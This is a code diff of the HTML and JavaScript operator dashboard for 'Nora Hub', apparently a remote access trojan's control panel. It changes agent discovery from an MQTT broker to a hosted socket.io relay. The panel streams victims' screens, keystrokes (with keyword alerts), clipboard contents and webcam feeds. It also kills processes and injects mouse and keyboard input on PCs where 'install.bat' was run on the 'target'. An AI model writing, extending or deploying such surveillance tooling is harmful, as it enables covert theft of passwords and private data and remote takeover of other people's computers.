@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Nora Hub</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/5.3.5/mqtt.min.js"></script>
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -48,15 +47,6 @@
   #topbar .logo { font-size: 15px; font-weight: 700; color: var(--accent); letter-spacing: 1px; }
   #topbar .logo span { color: var(--muted); font-weight: 400; }
   #topbar .spacer { flex: 1; }
-  #tunnel-bar {
-    background: #052e0f;
-    border: 1px solid var(--green);
-    color: var(--green);
-    padding: 3px 10px;
-    border-radius: 4px;
-    font-size: 11px;
-    display: none;
-  }
   .btn {
     padding: 6px 14px;
     border-radius: 5px;
@@ -70,7 +60,6 @@
   .btn-accent { background: var(--accent); color: #000; }
   .btn-ghost { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
   .btn-red { background: var(--red); color: #fff; }
-  .btn-green { background: var(--green); color: #000; }
 
   /* ── Main Layout ── */
   #main {
@@ -116,7 +105,6 @@
     cursor: pointer;
     transition: border-color .15s;
     background: var(--surface2);
-    position: relative;
   }
   .agent-card:hover { border-color: var(--accent); }
   .agent-card.active { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent); }
@@ -138,7 +126,7 @@
     border-radius: 50%;
     flex-shrink: 0;
   }
-  .status-dot.online { background: var(--green); box-shadow: 0 0 4px var(--green); }
+  .status-dot.online  { background: var(--green); box-shadow: 0 0 4px var(--green); }
   .status-dot.offline { background: var(--red); }
   .status-dot.connecting { background: var(--yellow); animation: pulse 1s infinite; }
   @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
@@ -150,12 +138,6 @@
     text-overflow: ellipsis;
     white-space: nowrap;
   }
-  .agent-remove {
-    background: none; border: none; color: var(--muted);
-    cursor: pointer; font-size: 14px; line-height: 1; padding: 0 2px;
-    flex-shrink: 0;
-  }
-  .agent-remove:hover { color: var(--red); }
   #no-agents {
     color: var(--muted);
     text-align: center;
@@ -164,7 +146,7 @@
     line-height: 1.6;
   }
 
-  /* ── Center: Screen + Controls ── */
+  /* ── Center ── */
   #center {
     flex: 1;
     display: flex;
@@ -205,11 +187,7 @@
   #ctrl-bar label { display: flex; align-items: center; gap: 5px; cursor: pointer; }
   #ctrl-bar input[type=checkbox] { accent-color: var(--accent); }
   .ctrl-sep { width: 1px; height: 16px; background: var(--border); }
-  #active-label {
-    font-weight: 700;
-    color: var(--accent);
-    font-size: 12px;
-  }
+  #active-label { font-weight: 700; color: var(--accent); font-size: 12px; }
 
   /* ── Right Panel ── */
   #panel {
@@ -221,23 +199,13 @@
     overflow: hidden;
     flex-shrink: 0;
   }
-  .tabs {
-    display: flex;
-    border-bottom: 1px solid var(--border);
-    flex-shrink: 0;
-  }
+  .tabs { display: flex; border-bottom: 1px solid var(--border); flex-shrink: 0; }
   .tab {
-    flex: 1;
-    padding: 9px 4px;
-    text-align: center;
-    font-size: 11px;
-    font-weight: 600;
-    cursor: pointer;
-    color: var(--muted);
+    flex: 1; padding: 9px 4px; text-align: center;
+    font-size: 11px; font-weight: 600; cursor: pointer; color: var(--muted);
     border-bottom: 2px solid transparent;
     transition: color .15s, border-color .15s;
-    text-transform: uppercase;
-    letter-spacing: .5px;
+    text-transform: uppercase; letter-spacing: .5px;
   }
   .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
   .tab-content { display: none; flex: 1; overflow: hidden; flex-direction: column; }
@@ -245,83 +213,35 @@
 
   /* Keylog */
   #keylog-box {
-    flex: 1;
-    overflow-y: auto;
-    padding: 10px;
-    font-family: 'Cascadia Code', 'Consolas', monospace;
-    font-size: 12px;
-    line-height: 1.7;
-    word-break: break-all;
-    color: #ccc;
-    white-space: pre-wrap;
+    flex: 1; overflow-y: auto; padding: 10px;
+    font-family: 'Cascadia Code','Consolas',monospace;
+    font-size: 12px; line-height: 1.7; word-break: break-all; color: #ccc; white-space: pre-wrap;
   }
-  #keylog-controls {
-    padding: 8px;
-    border-top: 1px solid var(--border);
-    display: flex;
-    gap: 6px;
-    flex-shrink: 0;
-  }
+  #keylog-controls { padding: 8px; border-top: 1px solid var(--border); display: flex; gap: 6px; flex-shrink: 0; }
   #kw-input {
-    flex: 1;
-    background: var(--surface2);
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 4px 8px;
-    border-radius: 4px;
-    font-size: 11px;
+    flex: 1; background: var(--surface2); border: 1px solid var(--border);
+    color: var(--text); padding: 4px 8px; border-radius: 4px; font-size: 11px;
   }
 
   /* Clipboard */
-  #clip-list {
-    flex: 1;
-    overflow-y: auto;
-    padding: 6px;
-    display: flex;
-    flex-direction: column;
-    gap: 4px;
-  }
+  #clip-list { flex: 1; overflow-y: auto; padding: 6px; display: flex; flex-direction: column; gap: 4px; }
   .clip-item {
-    background: var(--surface2);
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 6px 8px;
-    font-size: 11px;
-    color: #ccc;
-    cursor: pointer;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    white-space: nowrap;
-    transition: border-color .15s;
+    background: var(--surface2); border: 1px solid var(--border); border-radius: 4px;
+    padding: 6px 8px; font-size: 11px; color: #ccc; cursor: pointer;
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap; transition: border-color .15s;
   }
   .clip-item:hover { border-color: var(--accent); }
 
   /* Processes */
-  #proc-search {
-    padding: 6px;
-    border-bottom: 1px solid var(--border);
-    flex-shrink: 0;
-  }
+  #proc-search { padding: 6px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
   #proc-search input {
-    width: 100%;
-    background: var(--surface2);
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 5px 8px;
-    border-radius: 4px;
-    font-size: 11px;
+    width: 100%; background: var(--surface2); border: 1px solid var(--border);
+    color: var(--text); padding: 5px 8px; border-radius: 4px; font-size: 11px;
   }
-  #proc-list {
-    flex: 1;
-    overflow-y: auto;
-  }
+  #proc-list { flex: 1; overflow-y: auto; }
   .proc-row {
-    display: flex;
-    align-items: center;
-    padding: 4px 8px;
-    border-bottom: 1px solid #1a1a1a;
-    gap: 6px;
-    font-size: 11px;
+    display: flex; align-items: center; padding: 4px 8px;
+    border-bottom: 1px solid #1a1a1a; gap: 6px; font-size: 11px;
   }
   .proc-row:hover { background: var(--surface2); }
   .proc-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
@@ -331,56 +251,13 @@
     border-radius: 3px; padding: 1px 6px; cursor: pointer; font-size: 10px;
   }
   .proc-kill:hover { background: var(--red); color: #fff; }
-  #proc-refresh {
-    padding: 6px;
-    border-top: 1px solid var(--border);
-    flex-shrink: 0;
-  }
-
-  /* Modal */
-  #modal-overlay {
-    display: none;
-    position: fixed; inset: 0;
-    background: rgba(0,0,0,.7);
-    z-index: 100;
-    align-items: center;
-    justify-content: center;
-  }
-  #modal-overlay.show { display: flex; }
-  #modal {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: 24px;
-    width: 360px;
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-  }
-  #modal h2 { font-size: 15px; color: var(--accent); }
-  #modal label { font-size: 11px; color: var(--muted); display: block; margin-bottom: 4px; }
-  #modal input {
-    width: 100%;
-    background: var(--surface2);
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 8px 10px;
-    border-radius: 5px;
-    font-size: 13px;
-  }
-  #modal input:focus { outline: 1px solid var(--accent); }
-  #modal .row { display: flex; gap: 8px; justify-content: flex-end; }
+  #proc-refresh { padding: 6px; border-top: 1px solid var(--border); flex-shrink: 0; }
 
   /* Camera pip */
   #cam-pip {
-    position: absolute;
-    bottom: 10px; right: 10px;
-    width: 160px; height: 120px;
-    background: #000;
-    border: 2px solid var(--accent2);
-    border-radius: 6px;
-    overflow: hidden;
-    display: none;
+    position: absolute; bottom: 10px; right: 10px;
+    width: 160px; height: 120px; background: #000;
+    border: 2px solid var(--accent2); border-radius: 6px; overflow: hidden; display: none;
   }
   #cam-pip img { width: 100%; height: 100%; object-fit: cover; }
 
@@ -394,11 +271,9 @@
 <!-- Top Bar -->
 <div id="topbar">
   <div class="logo">NORA <span>HUB</span></div>
-  <div id="tunnel-bar"></div>
   <div class="spacer"></div>
   <span id="active-label">No agent selected</span>
-  <span id="mqtt-status" style="font-size:11px;color:var(--muted)">⬤ connecting...</span>
-  <button class="btn btn-accent" onclick="openModal()">+ Add Agent</button>
+  <span id="relay-status" style="font-size:11px;color:var(--yellow)">⬤ connecting...</span>
 </div>
 
 <!-- Main -->
@@ -411,7 +286,7 @@
       <span id="agent-count" style="color:var(--accent)">0</span>
     </div>
     <div id="agents-list">
-      <div id="no-agents">No agents yet.<br>Click <b>+ Add Agent</b><br>to connect a PC.</div>
+      <div id="no-agents">Waiting for agents...<br><br><small>Run install.bat<br>on the target PC</small></div>
     </div>
   </div>
 
@@ -442,7 +317,6 @@
       <div class="tab" onclick="switchTab('processes',this)">Processes</div>
     </div>
 
-    <!-- Keylog tab -->
     <div id="tab-keylog" class="tab-content active">
       <div id="keylog-box"></div>
       <div id="keylog-controls">
@@ -453,12 +327,10 @@
       </div>
     </div>
 
-    <!-- Clipboard tab -->
     <div id="tab-clipboard" class="tab-content">
       <div id="clip-list"></div>
     </div>
 
-    <!-- Processes tab -->
     <div id="tab-processes" class="tab-content">
       <div id="proc-search"><input id="proc-filter" placeholder="Search processes..." oninput="renderProcesses()"></div>
       <div id="proc-list"></div>
@@ -469,29 +341,13 @@
   </div>
 </div>
 
-
-<!-- Add Agent Modal -->
-<div id="modal-overlay" onclick="if(event.target===this)closeModal()">
-  <div id="modal">
-    <h2>Connect Agent</h2>
-    <div>
-      <label>Agent Name</label>
-      <input id="m-name" placeholder="e.g. Laptop A" maxlength="30">
-    </div>
-    <div>
-      <label>Agent URL (localhost.run URL or local IP:port)</label>
-      <input id="m-url" placeholder="https://abc.localhost.run or http://192.168.1.5:9090">
-    </div>
-    <div class="row">
-      <button class="btn btn-ghost" onclick="closeModal()">Cancel</button>
-      <button class="btn btn-accent" onclick="addAgent()">Connect</button>
-    </div>
-  </div>
-</div>
-
 <script>
-// ── State ────────────────────────────────────────────────────────────────────
-const agents   = {};   // id → { name, url, socket, status, keylog, clipboard, processes, lastFrame, thumbCtx }
+// ── Config ────────────────────────────────────────────────────────────────────
+// Update this URL after deploying nora-relay
+const RELAY_URL = 'https://YOUR-RELAY.up.railway.app';
+
+// ── State ─────────────────────────────────────────────────────────────────────
+const agents   = {};  // name → { name, status, keylog, clipboard, processes, lastFrame, thumbCanvas, thumbCtx }
 let activeId   = null;
 let remoteOn   = false;
 let keywords   = [];
@@ -505,150 +361,133 @@ const clipEl   = document.getElementById('clip-list');
 const procEl   = document.getElementById('proc-list');
 const camPip   = document.getElementById('cam-pip');
 const camImg   = document.getElementById('cam-img');
+const relayStatus = document.getElementById('relay-status');
 
-// ── Persist agents list ───────────────────────────────────────────────────────
-function saveAgentsToStorage() {
-  const data = Object.values(agents).map(a => ({ id: a.id, name: a.name, url: a.url }));
-  try { localStorage.setItem('nora_hub_agents', JSON.stringify(data)); } catch(e) {}
-}
-function loadAgentsFromStorage() {
-  try {
-    const data = JSON.parse(localStorage.getItem('nora_hub_agents') || '[]');
-    data.forEach(a => connectAgent(a.id, a.name, a.url));
-  } catch(e) {}
-}
+// ── Relay connection ──────────────────────────────────────────────────────────
+const relay = io(RELAY_URL, {
+  transports: ['websocket', 'polling'],
+  reconnectionDelay: 2000,
+  reconnectionAttempts: Infinity
+});
 
-// ── Modal ────────────────────────────────────────────────────────────────────
-function openModal() {
-  document.getElementById('modal-overlay').classList.add('show');
-  document.getElementById('m-name').focus();
-}
-function closeModal() {
-  document.getElementById('modal-overlay').classList.remove('show');
-  document.getElementById('m-name').value = '';
-  document.getElementById('m-url').value = '';
-}
-function addAgent() {
-  const name = document.getElementById('m-name').value.trim() || 'Agent';
-  let url    = document.getElementById('m-url').value.trim();
-  if (!url) return;
-  if (!/^https?:\/\//i.test(url)) url = 'http://' + url;
-  url = url.replace(/\/$/, '');
-  const id = 'a_' + Date.now();
-  connectAgent(id, name, url);
-  saveAgentsToStorage();
-  closeModal();
-}
+relay.on('connect', () => {
+  relayStatus.textContent = '⬤ relay connected';
+  relayStatus.style.color = 'var(--green)';
+  relay.emit('hub_join');
+});
 
-// ── Connect ──────────────────────────────────────────────────────────────────
-function connectAgent(id, name, url) {
-  if (agents[id]) return;
+relay.on('disconnect', () => {
+  relayStatus.textContent = '⬤ relay disconnected';
+  relayStatus.style.color = 'var(--red)';
+  Object.keys(agents).forEach(name => {
+    agents[name].status = 'offline';
+    updateCard(name);
+  });
+});
 
-  // Thumbnail canvas
-  const thumbCanvas = document.createElement('canvas');
-  thumbCanvas.width = 160; thumbCanvas.height = 95;
-  thumbCanvas.className = 'agent-thumb';
+relay.on('connect_error', () => {
+  relayStatus.textContent = '⬤ relay error';
+  relayStatus.style.color = 'var(--red)';
+});
 
-  const agent = {
-    id, name, url,
-    socket: null,
-    status: 'connecting',
-    keylog: '',
-    clipboard: [],
-    processes: [],
-    lastFrame: null,
-    thumbCtx: thumbCanvas.getContext('2d'),
-    thumbCanvas
+relay.on('agents_online', list => {
+  list.forEach(name => ensureAgent(name, true));
+});
+
+relay.on('agent_up', d => {
+  ensureAgent(d.name, true);
+  relay.emit('request_processes', { target: d.name });
+});
+
+relay.on('agent_down', d => {
+  const a = agents[d.name];
+  if (a) { a.status = 'offline'; updateCard(d.name); }
+});
+
+// ── Event forwarding from relay ───────────────────────────────────────────────
+relay.on('frame', d => {
+  const name = d._agent;
+  const a = agents[name];
+  if (!a) return;
+  const img = new Image();
+  img.onload = () => {
+    a.thumbCtx.drawImage(img, 0, 0, a.thumbCanvas.width, a.thumbCanvas.height);
+    if (activeId === name) {
+      screen.width  = img.naturalWidth;
+      screen.height = img.naturalHeight;
+      ctx.drawImage(img, 0, 0);
+    }
   };
-  agents[id] = agent;
+  img.src = 'data:image/jpeg;base64,' + d.data;
+  a.lastFrame = d.data;
+});
 
-  renderSidebar();
-
-  const sock = io(url, {
-    transports: ['polling', 'websocket'],
-    reconnectionDelay: 2000,
-    reconnectionAttempts: Infinity
-  });
-  agent.socket = sock;
-
-  sock.on('connect', () => {
-    agent.status = 'online';
-    updateCard(id);
-    if (activeId === id) setActiveLabel(name);
-    sock.emit('request_processes');
-  });
-
-  sock.on('disconnect', () => {
-    agent.status = 'offline';
-    updateCard(id);
-  });
-
-  sock.on('connect_error', () => {
-    agent.status = 'offline';
-    updateCard(id);
-  });
-
-  sock.on('frame', d => {
-    const img = new Image();
-    img.onload = () => {
-      // thumbnail
-      agent.thumbCtx.drawImage(img, 0, 0, thumbCanvas.width, thumbCanvas.height);
-      // main screen if active
-      if (activeId === id) {
-        screen.width  = img.naturalWidth;
-        screen.height = img.naturalHeight;
-        ctx.drawImage(img, 0, 0);
+relay.on('key', d => {
+  const name = d._agent;
+  const a = agents[name];
+  if (!a) return;
+  a.keylog += d.char;
+  if (activeId === name) appendKey(d.char);
+  keywords.forEach(kw => {
+    if (a.keylog.toLowerCase().includes(kw.toLowerCase())) {
+      const k = name + kw;
+      if (!alertCooldown[k]) {
+        alertCooldown[k] = true;
+        notify(`🚨 Keyword "${kw}" detected on ${name}`);
+        setTimeout(() => delete alertCooldown[k], 10000);
       }
+    }
+  });
+});
+
+relay.on('clipboard', d => {
+  const name = d._agent;
+  const a = agents[name];
+  if (!a) return;
+  if (a.clipboard[0] === d.text) return;
+  a.clipboard.unshift(d.text);
+  if (a.clipboard.length > 100) a.clipboard.pop();
+  if (activeId === name) renderClipboard();
+});
+
+relay.on('processes_data', d => {
+  const name = d._agent;
+  const a = agents[name];
+  if (!a) return;
+  a.processes = d;
+  if (activeId === name) renderProcesses();
+});
+
+relay.on('camera_frame', d => {
+  if (activeId === d._agent) {
+    camImg.src = 'data:image/jpeg;base64,' + d.data;
+    camPip.style.display = 'block';
+  }
+});
+
+relay.on('camera_state', d => {
+  if (activeId === d._agent) {
+    document.getElementById('cam-chk').checked = d.active;
+    if (!d.active) camPip.style.display = 'none';
+  }
+});
+
+// ── Agent management ──────────────────────────────────────────────────────────
+function ensureAgent(name, online) {
+  if (!agents[name]) {
+    const thumbCanvas = document.createElement('canvas');
+    thumbCanvas.width = 160; thumbCanvas.height = 95;
+    thumbCanvas.className = 'agent-thumb';
+    agents[name] = {
+      name, status: online ? 'online' : 'offline',
+      keylog: '', clipboard: [], processes: [], lastFrame: null,
+      thumbCanvas, thumbCtx: thumbCanvas.getContext('2d')
     };
-    img.src = 'data:image/jpeg;base64,' + d.data;
-    agent.lastFrame = d.data;
-  });
-
-  sock.on('key', d => {
-    agent.keylog += d.char;
-    if (activeId === id) appendKey(d.char);
-    // keyword alert
-    keywords.forEach(kw => {
-      if (agent.keylog.toLowerCase().includes(kw.toLowerCase())) {
-        const k = id + kw;
-        if (!alertCooldown[k]) {
-          alertCooldown[k] = true;
-          notify(`🚨 Keyword "${kw}" detected on ${name}`);
-          setTimeout(() => delete alertCooldown[k], 10000);
-        }
-      }
-    });
-  });
-
-  sock.on('clipboard', d => {
-    if (agent.clipboard[0] === d.text) return;
-    agent.clipboard.unshift(d.text);
-    if (agent.clipboard.length > 100) agent.clipboard.pop();
-    if (activeId === id) renderClipboard();
-  });
-
-  sock.on('processes_data', list => {
-    agent.processes = list;
-    if (activeId === id) renderProcesses();
-  });
-
-  sock.on('camera_frame', d => {
-    if (activeId === id) {
-      camImg.src = 'data:image/jpeg;base64,' + d.data;
-      camPip.style.display = 'block';
-    }
-  });
-
-  sock.on('camera_state', d => {
-    if (activeId === id) {
-      document.getElementById('cam-chk').checked = d.active;
-      if (!d.active) camPip.style.display = 'none';
-    }
-  });
-
-  sock.on('ngrok_url', d => {
-    if (activeId === id) showTunnelBar(d.url);
-  });
+    renderSidebar();
+  } else if (online) {
+    agents[name].status = 'online';
+    updateCard(name);
+  }
 }
 
 // ── Sidebar ───────────────────────────────────────────────────────────────────
@@ -656,71 +495,44 @@ function renderSidebar() {
   const list  = document.getElementById('agents-list');
   const noAg  = document.getElementById('no-agents');
   const count = document.getElementById('agent-count');
-  const ids   = Object.keys(agents);
-  count.textContent = ids.length;
-  noAg.style.display = ids.length ? 'none' : 'block';
-  // rebuild cards
+  const names = Object.keys(agents);
+  count.textContent = names.length;
+  noAg.style.display = names.length ? 'none' : 'block';
   list.querySelectorAll('.agent-card').forEach(el => el.remove());
-  ids.forEach(id => {
-    const a = agents[id];
+  names.forEach(name => {
+    const a = agents[name];
     const card = document.createElement('div');
-    card.className = 'agent-card' + (activeId === id ? ' active' : '');
-    card.id = 'card_' + id;
-    card.onclick = () => selectAgent(id);
-    const removeBtn = document.createElement('button');
-    removeBtn.className = 'agent-remove';
-    removeBtn.textContent = '×';
-    removeBtn.title = 'Remove';
-    removeBtn.onclick = e => { e.stopPropagation(); removeAgent(id); };
+    card.className = 'agent-card' + (activeId === name ? ' active' : '');
+    card.id = 'card_' + name;
+    card.onclick = () => selectAgent(name);
     const info = document.createElement('div');
     info.className = 'agent-info';
     const dot = document.createElement('div');
     dot.className = 'status-dot ' + a.status;
-    dot.id = 'dot_' + id;
+    dot.id = 'dot_' + name;
     const nm = document.createElement('div');
     nm.className = 'agent-name';
-    nm.textContent = a.name;
-    info.append(dot, nm, removeBtn);
+    nm.textContent = name;
+    info.append(dot, nm);
     card.append(a.thumbCanvas, info);
     list.append(card);
   });
 }
 
-function updateCard(id) {
-  const dot = document.getElementById('dot_' + id);
-  if (dot) { dot.className = 'status-dot ' + agents[id].status; }
+function updateCard(name) {
+  const dot = document.getElementById('dot_' + name);
+  if (dot) dot.className = 'status-dot ' + agents[name].status;
 }
 
-function removeAgent(id) {
-  if (agents[id]) {
-    agents[id].socket.disconnect();
-    delete agents[id];
-  }
-  if (activeId === id) {
-    activeId = null;
-    screen.style.display = 'none';
-    noSel.style.display = 'block';
-    setActiveLabel('No agent selected');
-    keylogEl.textContent = '';
-    clipEl.innerHTML = '';
-    procEl.innerHTML = '';
-    camPip.style.display = 'none';
-  }
-  saveAgentsToStorage();
-  renderSidebar();
-}
+// ── Select agent ──────────────────────────────────────────────────────────────
+function selectAgent(name) {
+  activeId = name;
+  const a = agents[name];
 
-// ── Select Agent ─────────────────────────────────────────────────────────────
-function selectAgent(id) {
-  activeId = id;
-  const a = agents[id];
-
-  // sidebar highlight
   document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('active'));
-  const card = document.getElementById('card_' + id);
+  const card = document.getElementById('card_' + name);
   if (card) card.classList.add('active');
 
-  // screen
   noSel.style.display = 'none';
   screen.style.display = 'block';
   if (a.lastFrame) {
@@ -729,43 +541,51 @@ function selectAgent(id) {
     img.src = 'data:image/jpeg;base64,' + a.lastFrame;
   }
 
-  // ui
-  setActiveLabel(a.name);
+  document.getElementById('active-label').textContent = name;
   document.getElementById('remote-chk').checked = false;
   remoteOn = false;
   screen.style.cursor = 'default';
 
-  // panels
   keylogEl.textContent = a.keylog;
   keylogEl.scrollTop = keylogEl.scrollHeight;
   renderClipboard();
   renderProcesses();
   camPip.style.display = 'none';
+
+  relay.emit('request_processes', { target: name });
 }
 
-function setActiveLabel(txt) {
-  document.getElementById('active-label').textContent = txt;
+// ── Commands ──────────────────────────────────────────────────────────────────
+function sendCmd(data) {
+  if (!activeId || !remoteOn) return;
+  relay.emit('command', { ...data, target: activeId });
+}
+
+function refreshProcesses() {
+  if (activeId) relay.emit('request_processes', { target: activeId });
+}
+
+function killProc(pid) {
+  if (activeId) relay.emit('kill_process', { pid, target: activeId });
+}
+
+function toggleCamera(on) {
+  if (activeId) relay.emit(on ? 'camera_on' : 'camera_off', { target: activeId });
+  if (!on) camPip.style.display = 'none';
 }
 
 // ── Keylog ────────────────────────────────────────────────────────────────────
-function appendKey(char) {
-  keylogEl.textContent += char;
-  keylogEl.scrollTop = keylogEl.scrollHeight;
-}
+function appendKey(char) { keylogEl.textContent += char; keylogEl.scrollTop = keylogEl.scrollHeight; }
 function saveKeylog() {
   const a = agents[activeId];
   if (!a) return;
   const blob = new Blob([a.keylog], { type: 'text/plain' });
   const url  = URL.createObjectURL(blob);
   const link = document.createElement('a');
-  link.href = url; link.download = a.name.replace(/\s+/g,'_') + '_keylog.txt';
+  link.href = url; link.download = activeId.replace(/\s+/g,'_') + '_keylog.txt';
   link.click(); URL.revokeObjectURL(url);
 }
-function clearKeylog() {
-  const a = agents[activeId];
-  if (!a) return;
-  a.keylog = ''; keylogEl.textContent = '';
-}
+function clearKeylog() { const a = agents[activeId]; if (!a) return; a.keylog = ''; keylogEl.textContent = ''; }
 function addKeyword() {
   const kw = document.getElementById('kw-input').value.trim();
   if (!kw || keywords.includes(kw)) return;
@@ -798,41 +618,15 @@ function renderProcesses() {
   list.forEach(p => {
     const row = document.createElement('div');
     row.className = 'proc-row';
-    row.innerHTML = `
-      <span class="proc-name" title="${p.name}">${p.name}</span>
+    row.innerHTML = `<span class="proc-name" title="${p.name}">${p.name}</span>
       <span class="proc-mem">${p.mem}MB</span>
       <button class="proc-kill" onclick="killProc(${p.pid})">Kill</button>`;
     procEl.appendChild(row);
   });
 }
-function refreshProcesses() {
-  const a = agents[activeId];
-  if (a && a.socket) a.socket.emit('request_processes');
-}
-function killProc(pid) {
-  const a = agents[activeId];
-  if (a && a.socket) a.socket.emit('kill_process', { pid });
-}
 
-// ── Camera ────────────────────────────────────────────────────────────────────
-function toggleCamera(on) {
-  const a = agents[activeId];
-  if (!a || !a.socket) return;
-  a.socket.emit(on ? 'camera_on' : 'camera_off');
-  if (!on) camPip.style.display = 'none';
-}
-
-// ── Remote Control ───────────────────────────────────────────────────────────
-function toggleRemote(on) {
-  remoteOn = on;
-  screen.style.cursor = on ? 'none' : 'default';
-}
-
-function sendCmd(data) {
-  const a = agents[activeId];
-  if (!a || !a.socket || !remoteOn) return;
-  a.socket.emit('command', data);
-}
+// ── Remote control ────────────────────────────────────────────────────────────
+function toggleRemote(on) { remoteOn = on; screen.style.cursor = on ? 'none' : 'default'; }
 
 screen.addEventListener('mousemove', e => {
   if (!remoteOn) return;
@@ -853,13 +647,6 @@ document.addEventListener('keyup', e => {
   sendCmd({ type: 'keyup', key: e.key });
 });
 
-// ── Tunnel Bar ────────────────────────────────────────────────────────────────
-function showTunnelBar(url) {
-  const bar = document.getElementById('tunnel-bar');
-  bar.textContent = '🌐 ' + url;
-  bar.style.display = 'block';
-}
-
 // ── Tabs ──────────────────────────────────────────────────────────────────────
 function switchTab(name, el) {
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -872,60 +659,11 @@ function switchTab(name, el) {
 
 // ── Notifications ─────────────────────────────────────────────────────────────
 function notify(msg) {
-  if (Notification.permission === 'granted') {
-    new Notification(msg);
-  } else if (Notification.permission !== 'denied') {
-    Notification.requestPermission().then(p => { if (p === 'granted') new Notification(msg); });
-  }
+  if (Notification.permission === 'granted') new Notification(msg);
+  else if (Notification.permission !== 'denied') Notification.requestPermission();
 }
 
-// ── MQTT Auto-Discovery ───────────────────────────────────────────────────────
-const MQTT_TOPIC = 'nora/7638d08dcd8340ef953c';
-const mqttStatus = document.getElementById('mqtt-status');
-
-const mqttClient = mqtt.connect('wss://broker.hivemq.com:8884/mqtt', {
-  clientId: 'nora_hub_' + Math.random().toString(36).slice(2, 9),
-  keepalive: 30,
-  reconnectPeriod: 3000
-});
-
-mqttClient.on('connect', () => {
-  mqttStatus.textContent = '⬤ live';
-  mqttStatus.style.color = 'var(--green)';
-  mqttClient.subscribe(MQTT_TOPIC + '/#');
-});
-
-mqttClient.on('reconnect', () => {
-  mqttStatus.textContent = '⬤ reconnecting...';
-  mqttStatus.style.color = 'var(--yellow)';
-});
-
-mqttClient.on('error', () => {
-  mqttStatus.textContent = '⬤ error';
-  mqttStatus.style.color = 'var(--red)';
-});
-
-mqttClient.on('message', (topic, message) => {
-  const pcName   = decodeURIComponent(topic.split('/').pop()).replace(/_/g, ' ');
-  const agentUrl = message.toString().trim();
-  if (!agentUrl.startsWith('http')) return;
-
-  // Show URL in top bar for debugging
-  showTunnelBar(pcName + ': ' + agentUrl);
-
-  const exists = Object.values(agents).find(a => a.name === pcName);
-  if (!exists) {
-    connectAgent('a_' + Date.now() + Math.random(), pcName, agentUrl);
-  } else if (exists.url !== agentUrl || exists.status === 'offline') {
-    removeAgent(exists.id);
-    connectAgent('a_' + Date.now() + Math.random(), pcName, agentUrl);
-  }
-  saveAgentsToStorage();
-});
-
-// ── Init ──────────────────────────────────────────────────────────────────────
 Notification.requestPermission();
-loadAgentsFromStorage();
 </script>
 </body>
 </html>
